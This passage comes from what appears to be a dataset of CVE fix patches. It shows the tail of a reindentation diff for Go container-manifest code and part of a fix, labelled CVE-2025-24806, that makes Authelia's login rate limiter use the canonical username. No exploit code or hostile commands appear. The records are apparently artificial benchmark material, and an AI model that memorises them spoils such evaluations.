\";\")\n-\t\trlLimitI, err := strconv.Atoi(lSplit[0])\n-\t\tif err != nil {\n-\t\t\trl.Limit = 0\n-\t\t} else {\n-\t\t\trl.Limit = rlLimitI\n-\t\t}\n-\t\tif len(lSplit) > 1 {\n-\t\t\trl.Policies = lpSplit\n-\t\t} else if len(lpSplit) > 1 {\n-\t\t\trl.Policies = lpSplit[1:]\n-\t\t}\n-\t}\n-\tif rlRemain != \"\" {\n-\t\trSplit := strings.Split(rlRemain, \";\")\n-\t\trlRemainI, err := strconv.Atoi(rSplit[0])\n-\t\tif err != nil {\n-\t\t\trl.Remain = 0\n-\t\t} else {\n-\t\t\trl.Remain = rlRemainI\n-\t\t\trl.Set = true\n-\t\t}\n-\t}\n-\tif rlReset != \"\" {\n-\t\trlResetI, err := strconv.Atoi(rlReset)\n-\t\tif err != nil {\n-\t\t\trl.Reset = 0\n-\t\t} else {\n-\t\t\trl.Reset = rlResetI\n-\t\t}\n-\t}\n-\treturn rl\n+        rl := types.RateLimit{}\n+        header, err := m.RawHeaders()\n+        if err != nil {\n+                return rl\n+        }\n+        // check for rate limit headers\n+        rlLimit := header.Get(\"RateLimit-Limit\")\n+        rlRemain := header.Get(\"RateLimit-Remaining\")\n+        rlReset := header.Get(\"RateLimit-Reset\")\n+        if rlLimit != \"\" {\n+                lpSplit := strings.Split(rlLimit, \",\")\n+                lSplit := strings.Split(lpSplit[0], \";\")\n+                rlLimitI, err := strconv.Atoi(lSplit[0])\n+                if err != nil {\n+                        rl.Limit = 0\n+                } else {\n+                        rl.Limit = rlLimitI\n+                }\n+                if len(lSplit) > 1 {\n+                        rl.Policies = lpSplit\n+                } else if len(lpSplit) > 1 {\n+                        rl.Policies = lpSplit[1:]\n+                }\n+        }\n+        if rlRemain != \"\" {\n+                rSplit := strings.Split(rlRemain, \";\")\n+                rlRemainI, err := strconv.Atoi(rSplit[0])\n+                if err != nil {\n+                        rl.Remain = 0\n+                } else {\n+                        rl.Remain = rlRemainI\n+                        rl.Set = true\n+                }\n+        }\n+        if rlReset != \"\" {\n+                rlResetI, err := strconv.Atoi(rlReset)\n+                if err != nil {\n+                        rl.Reset = 0\n+                } else {\n+                        rl.Reset = rlResetI\n+                }\n+        }\n+        return rl\n }\n \n // HasRateLimit indicates whether the rate limit is set and available.\n func HasRateLimit(m Manifest) bool {\n-\trl := GetRateLimit(m)\n-\treturn rl.Set\n+        rl := GetRateLimit(m)\n+        return rl.Set\n }\n \n // OCIIndexFromAny converts manifest lists to an OCI index.\n func OCIIndexFromAny(orig interface{}) (v1.Index, error) {\n-\tociI := v1.Index{\n-\t\tVersioned: v1.IndexSchemaVersion,\n-\t\tMediaType: mediatype.OCI1ManifestList,\n-\t}\n-\tswitch orig := orig.(type) {\n-\tcase schema2.ManifestList:\n-\t\tociI.Manifests = orig.Manifests\n-\t\tociI.Annotations = orig.Annotations\n-\tcase v1.Index:\n-\t\tociI = orig\n-\tdefault:\n-\t\treturn ociI, fmt.Errorf(\"unable to convert %T to OCI index\", orig)\n-\t}\n-\treturn ociI, nil\n+        ociI := v1.Index{\n+                Versioned: v1.IndexSchemaVersion,\n+                MediaType: mediatype.OCI1ManifestList,\n+        }\n+        switch orig := orig.(type) {\n+        case schema2.ManifestList:\n+                ociI.Manifests = orig.Manifests\n+                ociI.Annotations = orig.Annotations\n+        case v1.Index:\n+                ociI = orig\n+        default:\n+                return ociI, fmt.Errorf(\"unable to convert %T to OCI index\", orig)\n+        }\n+        return ociI, nil\n }\n \n // OCIIndexToAny converts from an OCI index back to the manifest list.\n func OCIIndexToAny(ociI v1.Index, origP interface{}) error {\n-\t// reflect is used to handle both *interface{} and *Manifest\n-\trv := reflect.ValueOf(origP)\n-\tfor rv.IsValid() && rv.Type().Kind() == reflect.Ptr {\n-\t\trv = rv.Elem()\n-\t}\n-\tif !rv.IsValid() {\n-\t\treturn fmt.Errorf(\"invalid manifest output parameter: %T\", origP)\n-\t}\n-\tif !rv.CanSet() {\n-\t\treturn fmt.Errorf(\"manifest output must be a pointer: %T\", origP)\n-\t}\n-\torigR := rv.Interface()\n-\tswitch orig := (origR).(type) {\n-\tcase schema2.ManifestList:\n-\t\torig.Versioned = schema2.ManifestListSchemaVersion\n-\t\torig.Manifests = ociI.Manifests\n-\t\torig.Annotations = ociI.Annotations\n-\t\trv.Set(reflect.ValueOf(orig))\n-\tcase v1.Index:\n-\t\trv.Set(reflect.ValueOf(ociI))\n-\tdefault:\n-\t\treturn fmt.Errorf(\"unable to convert OCI index to %T\", origR)\n-\t}\n-\treturn nil\n+        // reflect is used to handle both *interface{} and *Manifest\n+        rv := reflect.ValueOf(origP)\n+        for rv.IsValid() && rv.Type().Kind() == reflect.Ptr {\n+                rv = rv.Elem()\n+        }\n+        if !rv.IsValid() {\n+                return fmt.Errorf(\"invalid manifest output parameter: %T\", origP)\n+        }\n+        if !rv.CanSet() {\n+                return fmt.Errorf(\"manifest output must be a pointer: %T\", origP)\n+        }\n+        origR := rv.Interface()\n+        switch orig := (origR).(type) {\n+        case schema2.ManifestList:\n+                orig.Versioned = schema2.ManifestListSchemaVersion\n+                orig.Manifests = ociI.Manifests\n+                orig.Annotations = ociI.Annotations\n+                rv.Set(reflect.ValueOf(orig))\n+        case v1.Index:\n+                rv.Set(reflect.ValueOf(ociI))\n+        default:\n+                return fmt.Errorf(\"unable to convert OCI index to %T\", origR)\n+        }\n+        return nil\n }\n \n // OCIManifestFromAny converts an image manifest to an OCI manifest.\n func OCIManifestFromAny(orig interface{}) (v1.Manifest, error) {\n-\tociM := v1.Manifest{\n-\t\tVersioned: v1.ManifestSchemaVersion,\n-\t\tMediaType: mediatype.OCI1Manifest,\n-\t}\n-\tswitch orig := orig.(type) {\n-\tcase schema2.Manifest:\n-\t\tociM.Config = orig.Config\n-\t\tociM.Layers = orig.Layers\n-\t\tociM.Annotations = orig.Annotations\n-\tcase v1.Manifest:\n-\t\tociM = orig\n-\tdefault:\n-\t\t// TODO: consider supporting Docker schema v1 media types\n-\t\treturn ociM, fmt.Errorf(\"unable to convert %T to OCI image\", orig)\n-\t}\n-\treturn ociM, nil\n+        ociM := v1.Manifest{\n+                Versioned: v1.ManifestSchemaVersion,\n+                MediaType: mediatype.OCI1Manifest,\n+        }\n+        switch orig := orig.(type) {\n+        case schema2.Manifest:\n+                ociM.Config = orig.Config\n+                ociM.Layers = orig.Layers\n+                ociM.Annotations = orig.Annotations\n+        case v1.Manifest:\n+                ociM = orig\n+        default:\n+                // TODO: consider supporting Docker schema v1 media types\n+                return ociM, fmt.Errorf(\"unable to convert %T to OCI image\", orig)\n+        }\n+        return ociM, nil\n }\n \n // OCIManifestToAny converts an OCI manifest back to the image manifest.\n func OCIManifestToAny(ociM v1.Manifest, origP interface{}) error {\n-\t// reflect is used to handle both *interface{} and *Manifest\n-\trv := reflect.ValueOf(origP)\n-\tfor rv.IsValid() && rv.Type().Kind() == reflect.Ptr {\n-\t\trv = rv.Elem()\n-\t}\n-\tif !rv.IsValid() {\n-\t\treturn fmt.Errorf(\"invalid manifest output parameter: %T\", origP)\n-\t}\n-\tif !rv.CanSet() {\n-\t\treturn fmt.Errorf(\"manifest output must be a pointer: %T\", origP)\n-\t}\n-\torigR := rv.Interface()\n-\tswitch orig := (origR).(type) {\n-\tcase schema2.Manifest:\n-\t\torig.Versioned = schema2.ManifestSchemaVersion\n-\t\torig.Config = ociM.Config\n-\t\torig.Layers = ociM.Layers\n-\t\torig.Annotations = ociM.Annotations\n-\t\trv.Set(reflect.ValueOf(orig))\n-\tcase v1.Manifest:\n-\t\trv.Set(reflect.ValueOf(ociM))\n-\tdefault:\n-\t\t// Docker schema v1 will not be supported, can't resign, and no need for unsigned\n-\t\treturn fmt.Errorf(\"unable to convert OCI image to %T\", origR)\n-\t}\n-\treturn nil\n+        // reflect is used to handle both *interface{} and *Manifest\n+        rv := reflect.ValueOf(origP)\n+        for rv.IsValid() && rv.Type().Kind() == reflect.Ptr {\n+                rv = rv.Elem()\n+        }\n+        if !rv.IsValid() {\n+                return fmt.Errorf(\"invalid manifest output parameter: %T\", origP)\n+        }\n+        if !rv.CanSet() {\n+                return fmt.Errorf(\"manifest output must be a pointer: %T\", origP)\n+        }\n+        origR := rv.Interface()\n+        switch orig := (origR).(type) {\n+        case schema2.Manifest:\n+                orig.Versioned = schema2.ManifestSchemaVersion\n+                orig.Config = ociM.Config\n+                orig.Layers = ociM.Layers\n+                orig.Annotations = ociM.Annotations\n+                rv.Set(reflect.ValueOf(orig))\n+        case v1.Manifest:\n+                rv.Set(reflect.ValueOf(ociM))\n+        default:\n+                // Docker schema v1 will not be supported, can't resign, and no need for unsigned\n+                return fmt.Errorf(\"unable to convert OCI image to %T\", origR)\n+        }\n+        return nil\n }\n \n // FromOrig creates a new manifest from the original upstream manifest type.\n // This method should be used if you are creating a new manifest rather than pulling one from a registry.\n func fromOrig(c common, orig interface{}) (Manifest, error) {\n-\tvar mt string\n-\tvar m Manifest\n-\torigDigest := c.desc.Digest\n-\n-\tmj, err := json.Marshal(orig)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tc.manifSet = true\n-\tif len(c.rawBody) == 0 {\n-\t\tc.rawBody = mj\n-\t}\n-\tif _, ok := orig.(schema1.SignedManifest); !ok {\n-\t\tc.desc.Digest = c.desc.DigestAlgo().FromBytes(mj)\n-\t}\n-\tif c.desc.Size == 0 {\n-\t\tc.desc.Size = int64(len(mj))\n-\t}\n-\t// create manifest based on type\n-\tswitch mOrig := orig.(type) {\n-\tcase schema1.Manifest:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.Docker1Manifest\n-\t\tm = &docker1Manifest{\n-\t\t\tcommon:   c,\n-\t\t\tManifest: mOrig,\n-\t\t}\n-\tcase schema1.SignedManifest:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.Docker1ManifestSigned\n-\t\t// recompute digest on the canonical data\n-\t\tc.desc.Digest = c.desc.DigestAlgo().FromBytes(mOrig.Canonical)\n-\t\tm = &docker1SignedManifest{\n-\t\t\tcommon:         c,\n-\t\t\tSignedManifest: mOrig,\n-\t\t}\n-\tcase schema2.Manifest:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.Docker2Manifest\n-\t\tm = &docker2Manifest{\n-\t\t\tcommon:   c,\n-\t\t\tManifest: mOrig,\n-\t\t}\n-\tcase schema2.ManifestList:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.Docker2ManifestList\n-\t\tm = &docker2ManifestList{\n-\t\t\tcommon:       c,\n-\t\t\tManifestList: mOrig,\n-\t\t}\n-\tcase v1.Manifest:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.OCI1Manifest\n-\t\tm = &oci1Manifest{\n-\t\t\tcommon:   c,\n-\t\t\tManifest: mOrig,\n-\t\t}\n-\tcase v1.Index:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.OCI1ManifestList\n-\t\tm = &oci1Index{\n-\t\t\tcommon: c,\n-\t\t\tIndex:  orig.(v1.Index),\n-\t\t}\n-\tcase v1.ArtifactManifest:\n-\t\tmt = mOrig.MediaType\n-\t\tc.desc.MediaType = mediatype.OCI1Artifact\n-\t\tm = &oci1Artifact{\n-\t\t\tcommon:           c,\n-\t\t\tArtifactManifest: mOrig,\n-\t\t}\n-\tdefault:\n-\t\treturn nil, fmt.Errorf(\"unsupported type to convert to a manifest: %T\", orig)\n-\t}\n-\t// verify media type\n-\terr = verifyMT(c.desc.MediaType, mt)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\t// verify digest didn't change\n-\tif origDigest != \"\" && origDigest != c.desc.Digest {\n-\t\treturn nil, fmt.Errorf(\"manifest digest mismatch, expected %s, computed %s\", origDigest, c.desc.Digest)\n-\t}\n-\treturn m, nil\n+        var mt string\n+        var m Manifest\n+        origDigest := c.desc.Digest\n+\n+        mj, err := json.Marshal(orig)\n+        if err != nil {\n+                return nil, err\n+        }\n+        c.manifSet = true\n+        if len(c.rawBody) == 0 {\n+                c.rawBody = mj\n+        }\n+        if _, ok := orig.(schema1.SignedManifest); !ok {\n+                c.desc.Digest = c.desc.DigestAlgo().FromBytes(mj)\n+        }\n+        if c.desc.Size == 0 {\n+                c.desc.Size = int64(len(mj))\n+        }\n+        // create manifest based on type\n+        switch mOrig := orig.(type) {\n+        case schema1.Manifest:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.Docker1Manifest\n+                m = &docker1Manifest{\n+                        common:   c,\n+                        Manifest: mOrig,\n+                }\n+        case schema1.SignedManifest:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.Docker1ManifestSigned\n+                // recompute digest on the canonical data\n+                c.desc.Digest = c.desc.DigestAlgo().FromBytes(mOrig.Canonical)\n+                m = &docker1SignedManifest{\n+                        common:         c,\n+                        SignedManifest: mOrig,\n+                }\n+        case schema2.Manifest:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.Docker2Manifest\n+                m = &docker2Manifest{\n+                        common:   c,\n+                        Manifest: mOrig,\n+                }\n+        case schema2.ManifestList:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.Docker2ManifestList\n+                m = &docker2ManifestList{\n+                        common:       c,\n+                        ManifestList: mOrig,\n+                }\n+        case v1.Manifest:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.OCI1Manifest\n+                m = &oci1Manifest{\n+                        common:   c,\n+                        Manifest: mOrig,\n+                }\n+        case v1.Index:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.OCI1ManifestList\n+                m = &oci1Index{\n+                        common: c,\n+                        Index:  orig.(v1.Index),\n+                }\n+        case v1.ArtifactManifest:\n+                mt = mOrig.MediaType\n+                c.desc.MediaType = mediatype.OCI1Artifact\n+                m = &oci1Artifact{\n+                        common:           c,\n+                        ArtifactManifest: mOrig,\n+                }\n+        default:\n+                return nil, fmt.Errorf(\"unsupported type to convert to a manifest: %T\", orig)\n+        }\n+        // verify media type\n+        err = verifyMT(c.desc.MediaType, mt)\n+        if err != nil {\n+                return nil, err\n+        }\n+        // verify digest didn't change\n+        if origDigest != \"\" && origDigest != c.desc.Digest {\n+                return nil, fmt.Errorf(\"manifest digest mismatch, expected %s, computed %s\", origDigest, c.desc.Digest)\n+        }\n+        return m, nil\n }\n \n // fromCommon is used to create a manifest when the underlying manifest struct is not provided.\n func fromCommon(c common) (Manifest, error) {\n-\tvar err error\n-\tvar m Manifest\n-\tvar mt string\n-\torigDigest := c.desc.Digest\n-\t// extract common data from from rawBody\n-\tif len(c.rawBody) > 0 {\n-\t\tc.manifSet = true\n-\t\t// extract media type from body, either explicitly or with duck typing\n-\t\tif c.desc.MediaType == \"\" {\n-\t\t\tmt := struct {\n-\t\t\t\tMediaType     string                  `json:\"mediaType,omitempty\"`\n-\t\t\t\tSchemaVersion int                     `json:\"schemaVersion,omitempty\"`\n-\t\t\t\tSignatures    []interface{}           `json:\"signatures,omitempty\"`\n-\t\t\t\tManifests     []descriptor.Descriptor `json:\"manifests,omitempty\"`\n-\t\t\t\tLayers        []descriptor.Descriptor `json:\"layers,omitempty\"`\n-\t\t\t}{}\n-\t\t\terr = json.Unmarshal(c.rawBody, &mt)\n-\t\t\tif mt.MediaType != \"\" {\n-\t\t\t\tc.desc.MediaType = mt.MediaType\n-\t\t\t} else if mt.SchemaVersion == 1 && len(mt.Signatures) > 0 {\n-\t\t\t\tc.desc.MediaType = mediatype.Docker1ManifestSigned\n-\t\t\t} else if mt.SchemaVersion == 1 {\n-\t\t\t\tc.desc.MediaType = mediatype.Docker1Manifest\n-\t\t\t} else if len(mt.Manifests) > 0 {\n-\t\t\t\tif strings.HasPrefix(mt.Manifests[0].MediaType, \"application/vnd.docker.\") {\n-\t\t\t\t\tc.desc.MediaType = mediatype.Docker2ManifestList\n-\t\t\t\t} else {\n-\t\t\t\t\tc.desc.MediaType = mediatype.OCI1ManifestList\n-\t\t\t\t}\n-\t\t\t} else if len(mt.Layers) > 0 {\n-\t\t\t\tif strings.HasPrefix(mt.Layers[0].MediaType, \"application/vnd.docker.\") {\n-\t\t\t\t\tc.desc.MediaType = mediatype.Docker2Manifest\n-\t\t\t\t} else {\n-\t\t\t\t\tc.desc.MediaType = mediatype.OCI1Manifest\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\t// compute digest\n-\t\tif c.desc.MediaType != mediatype.Docker1ManifestSigned {\n-\t\t\td := c.desc.DigestAlgo().FromBytes(c.rawBody)\n-\t\t\tc.desc.Digest = d\n-\t\t\tc.desc.Size = int64(len(c.rawBody))\n-\t\t}\n-\t}\n-\tswitch c.desc.MediaType {\n-\tcase mediatype.Docker1Manifest:\n-\t\tvar mOrig schema1.Manifest\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t}\n-\t\tm = &docker1Manifest{common: c, Manifest: mOrig}\n-\tcase mediatype.Docker1ManifestSigned:\n-\t\tvar mOrig schema1.SignedManifest\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t\td := c.desc.DigestAlgo().FromBytes(mOrig.Canonical)\n-\t\t\tc.desc.Digest = d\n-\t\t\tc.desc.Size = int64(len(mOrig.Canonical))\n-\t\t}\n-\t\tm = &docker1SignedManifest{common: c, SignedManifest: mOrig}\n-\tcase mediatype.Docker2Manifest:\n-\t\tvar mOrig schema2.Manifest\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t}\n-\t\tm = &docker2Manifest{common: c, Manifest: mOrig}\n-\tcase mediatype.Docker2ManifestList:\n-\t\tvar mOrig schema2.ManifestList\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t}\n-\t\tm = &docker2ManifestList{common: c, ManifestList: mOrig}\n-\tcase mediatype.OCI1Manifest:\n-\t\tvar mOrig v1.Manifest\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t}\n-\t\tm = &oci1Manifest{common: c, Manifest: mOrig}\n-\tcase mediatype.OCI1ManifestList:\n-\t\tvar mOrig v1.Index\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t}\n-\t\tm = &oci1Index{common: c, Index: mOrig}\n-\tcase mediatype.OCI1Artifact:\n-\t\tvar mOrig v1.ArtifactManifest\n-\t\tif len(c.rawBody) > 0 {\n-\t\t\terr = json.Unmarshal(c.rawBody, &mOrig)\n-\t\t\tmt = mOrig.MediaType\n-\t\t}\n-\t\tm = &oci1Artifact{common: c, ArtifactManifest: mOrig}\n-\tdefault:\n-\t\treturn nil, fmt.Errorf(\"%w: \\\"%s\\\"\", errs.ErrUnsupportedMediaType, c.desc.MediaType)\n-\t}\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error unmarshaling manifest for %s: %w\", c.r.CommonName(), err)\n-\t}\n-\t// verify media type\n-\terr = verifyMT(c.desc.MediaType, mt)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\t// verify digest didn't change\n-\tif origDigest != \"\" && origDigest != c.desc.Digest {\n-\t\treturn nil, fmt.Errorf(\"manifest digest mismatch, expected %s, computed %s\", origDigest, c.desc.Digest)\n-\t}\n-\treturn m, nil\n+        var err error\n+        var m Manifest\n+        var mt string\n+        origDigest := c.desc.Digest\n+        // extract common data from from rawBody\n+        if len(c.rawBody) > 0 {\n+                c.manifSet = true\n+                // extract media type from body, either explicitly or with duck typing\n+                if c.desc.MediaType == \"\" {\n+                        mt := struct {\n+                                MediaType     string                  `json:\"mediaType,omitempty\"`\n+                                SchemaVersion int                     `json:\"schemaVersion,omitempty\"`\n+                                Signatures    []interface{}           `json:\"signatures,omitempty\"`\n+                                Manifests     []descriptor.Descriptor `json:\"manifests,omitempty\"`\n+                                Layers        []descriptor.Descriptor `json:\"layers,omitempty\"`\n+                        }{}\n+                        err = json.Unmarshal(c.rawBody, &mt)\n+                        if mt.MediaType != \"\" {\n+                                c.desc.MediaType = mt.MediaType\n+                        } else if mt.SchemaVersion == 1 && len(mt.Signatures) > 0 {\n+                                c.desc.MediaType = mediatype.Docker1ManifestSigned\n+                        } else if mt.SchemaVersion == 1 {\n+                                c.desc.MediaType = mediatype.Docker1Manifest\n+                        } else if len(mt.Manifests) > 0 {\n+                                if strings.HasPrefix(mt.Manifests[0].MediaType, \"application/vnd.docker.\") {\n+                                        c.desc.MediaType = mediatype.Docker2ManifestList\n+                                } else {\n+                                        c.desc.MediaType = mediatype.OCI1ManifestList\n+                                }\n+                        } else if len(mt.Layers) > 0 {\n+                                if strings.HasPrefix(mt.Layers[0].MediaType, \"application/vnd.docker.\") {\n+                                        c.desc.MediaType = mediatype.Docker2Manifest\n+                                } else {\n+                                        c.desc.MediaType = mediatype.OCI1Manifest\n+                                }\n+                        }\n+                }\n+                // compute digest\n+                if c.desc.MediaType != mediatype.Docker1ManifestSigned {\n+                        d := c.desc.DigestAlgo().FromBytes(c.rawBody)\n+                        c.desc.Digest = d\n+                        c.desc.Size = int64(len(c.rawBody))\n+                }\n+        }\n+        switch c.desc.MediaType {\n+        case mediatype.Docker1Manifest:\n+                var mOrig schema1.Manifest\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                }\n+                m = &docker1Manifest{common: c, Manifest: mOrig}\n+        case mediatype.Docker1ManifestSigned:\n+                var mOrig schema1.SignedManifest\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                        d := c.desc.DigestAlgo().FromBytes(mOrig.Canonical)\n+                        c.desc.Digest = d\n+                        c.desc.Size = int64(len(mOrig.Canonical))\n+                }\n+                m = &docker1SignedManifest{common: c, SignedManifest: mOrig}\n+        case mediatype.Docker2Manifest:\n+                var mOrig schema2.Manifest\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                }\n+                m = &docker2Manifest{common: c, Manifest: mOrig}\n+        case mediatype.Docker2ManifestList:\n+                var mOrig schema2.ManifestList\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                }\n+                m = &docker2ManifestList{common: c, ManifestList: mOrig}\n+        case mediatype.OCI1Manifest:\n+                var mOrig v1.Manifest\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                }\n+                m = &oci1Manifest{common: c, Manifest: mOrig}\n+        case mediatype.OCI1ManifestList:\n+                var mOrig v1.Index\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                }\n+                m = &oci1Index{common: c, Index: mOrig}\n+        case mediatype.OCI1Artifact:\n+                var mOrig v1.ArtifactManifest\n+                if len(c.rawBody) > 0 {\n+                        err = json.Unmarshal(c.rawBody, &mOrig)\n+                        mt = mOrig.MediaType\n+                }\n+                m = &oci1Artifact{common: c, ArtifactManifest: mOrig}\n+        default:\n+                return nil, fmt.Errorf(\"%w: \\\"%s\\\"\", errs.ErrUnsupportedMediaType, c.desc.MediaType)\n+        }\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error unmarshaling manifest for %s: %w\", c.r.CommonName(), err)\n+        }\n+        // verify media type\n+        err = verifyMT(c.desc.MediaType, mt)\n+        if err != nil {\n+                return nil, err\n+        }\n+        // verify digest didn't change\n+        if origDigest != \"\" && origDigest != c.desc.Digest {\n+                return nil, fmt.Errorf(\"manifest digest mismatch, expected %s, computed %s\", origDigest, c.desc.Digest)\n+        }\n+        return m, nil\n }\n \n func verifyMT(expected, received string) error {\n-\tif received != \"\" && expected != received {\n-\t\treturn fmt.Errorf(\"manifest contains an unexpected media type: expected %s, received %s\", expected, received)\n-\t}\n-\treturn nil\n+        if received != \"\" && expected != received {\n+                return fmt.Errorf(\"manifest contains an unexpected media type: expected %s, received %s\", expected, received)\n+        }\n+        return nil\n }\n \n func getPlatformList(dl []descriptor.Descriptor) ([]*platform.Platform, error) {\n-\tvar l []*platform.Platform\n-\tfor _, d := range dl {\n-\t\tif d.Platform != nil {\n-\t\t\tl = append(l, d.Platform)\n-\t\t}\n-\t}\n-\treturn l, nil\n+        var l []*platform.Platform\n+        for _, d := range dl {\n+                if d.Platform != nil {\n+                        l = append(l, d.Platform)\n+                }\n+        }\n+        return l, nil\n }\n"}
{"cve":"CVE-2025-24806:0708", "fix_patch": "diff --git a/internal/handlers/handler_firstfactor.go b/internal/handlers/handler_firstfactor.go\nindex 85b487aa3..f357f2386 100644\n--- a/internal/handlers/handler_firstfactor.go\n+++ b/internal/handlers/handler_firstfactor.go\n@@ -1,159 +1,165 @@\n package handlers\n \n import (\n-\t\"errors\"\n-\t\"time\"\n+        \"errors\"\n+        \"time\"\n \n-\t\"github.com/authelia/authelia/v4/internal/middlewares\"\n-\t\"github.com/authelia/authelia/v4/internal/regulation\"\n+        \"github.com/authelia/authelia/v4/internal/middlewares\"\n+        \"github.com/authelia/authelia/v4/internal/regulation\"\n )\n \n // FirstFactorPOST is the handler performing the first factory.\n //\n //nolint:gocyclo // TODO: Consider refactoring time permitting.\n func FirstFactorPOST(delayFunc middlewares.TimingAttackDelayFunc) middlewares.RequestHandler {\n-\treturn func(ctx *middlewares.AutheliaCtx) {\n-\t\tvar successful bool\n+        return func(ctx *middlewares.AutheliaCtx) {\n+                var successful bool\n \n-\t\trequestTime := time.Now()\n+                requestTime := time.Now()\n \n-\t\tif delayFunc != nil {\n-\t\t\tdefer delayFunc(ctx, requestTime, &successful)\n-\t\t}\n+                if delayFunc != nil {\n+                        defer delayFunc(ctx, requestTime, &successful)\n+                }\n \n-\t\tbodyJSON := bodyFirstFactorRequest{}\n+                bodyJSON := bodyFirstFactorRequest{}\n \n-\t\tif err := ctx.ParseBody(&bodyJSON); err != nil {\n-\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrParseRequestBody, regulation.AuthType1FA)\n+                if err := ctx.ParseBody(&bodyJSON); err != nil {\n+                        ctx.Logger.WithError(err).Errorf(logFmtErrParseRequestBody, regulation.AuthType1FA)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+                        respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\treturn\n-\t\t}\n+                        return\n+                }\n \n-\t\tif bannedUntil, err := ctx.Providers.Regulator.Regulate(ctx, bodyJSON.Username); err != nil {\n-\t\t\tif errors.Is(err, regulation.ErrUserIsBanned) {\n-\t\t\t\t_ = markAuthenticationAttempt(ctx, false, &bannedUntil, bodyJSON.Username, regulation.AuthType1FA, nil)\n+userDetails, errDetails := ctx.Providers.UserProvider.GetDetails(bodyJSON.Username)\n+username := bodyJSON.Username\n \n-\t\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+if errDetails == nil {\n+username = userDetails.Username\n+}\n \n-\t\t\t\treturn\n-\t\t\t}\n+if bannedUntil, err := ctx.Providers.Regulator.Regulate(ctx, username); err != nil {\n+if errors.Is(err, regulation.ErrUserIsBanned) {\n+_ = markAuthenticationAttempt(ctx, false, &bannedUntil, username, regulation.AuthType1FA, nil)\n \n-\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrRegulationFail, regulation.AuthType1FA, bodyJSON.Username)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+return\n+}\n \n-\t\t\treturn\n-\t\t}\n+ctx.Logger.WithError(err).Errorf(logFmtErrRegulationFail, regulation.AuthType1FA, username)\n \n-\t\tuserPasswordOk, err := ctx.Providers.UserProvider.CheckUserPassword(bodyJSON.Username, bodyJSON.Password)\n-\t\tif err != nil {\n-\t\t\t_ = markAuthenticationAttempt(ctx, false, nil, bodyJSON.Username, regulation.AuthType1FA, err)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+return\n+}\n \n-\t\t\treturn\n-\t\t}\n+userPasswordOk, err := ctx.Providers.UserProvider.CheckUserPassword(bodyJSON.Username, bodyJSON.Password)\n \n-\t\tif !userPasswordOk {\n-\t\t\t_ = markAuthenticationAttempt(ctx, false, nil, bodyJSON.Username, regulation.AuthType1FA, nil)\n+if errDetails != nil {\n+_ = markAuthenticationAttempt(ctx, false, nil, username, regulation.AuthType1FA, errDetails)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\treturn\n-\t\t}\n+return\n+}\n \n-\t\tif err = markAuthenticationAttempt(ctx, true, nil, bodyJSON.Username, regulation.AuthType1FA, nil); err != nil {\n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+if err != nil {\n+_ = markAuthenticationAttempt(ctx, false, nil, username, regulation.AuthType1FA, err)\n \n-\t\t\treturn\n-\t\t}\n+respondUnauthorized(ctx, 